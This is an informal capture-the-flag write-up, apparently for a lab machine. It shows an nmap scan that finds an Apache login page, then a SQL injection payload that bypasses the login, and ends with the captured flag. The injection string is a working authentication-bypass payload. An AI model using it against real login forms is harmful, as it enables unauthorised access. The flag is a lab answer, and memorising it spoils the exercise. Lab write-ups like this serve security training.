

Nmap scanning:
~~~
nmap 10.129.171.23 -sC -sV 
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:46 EDT
Nmap scan report for 10.129.171.23
Host is up (0.29s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds

apache http server is the free and open source web server to delivers the web content through the internet.
~~~



i try the all port no ports are open 
after this we find that 80 port is open 

and this web page is vuln to sql injection it is injected to normal playload

~~~
1'OR'1'='1'-- --
~~~




flag: e3d0796d002a446c0e622226f42e9672







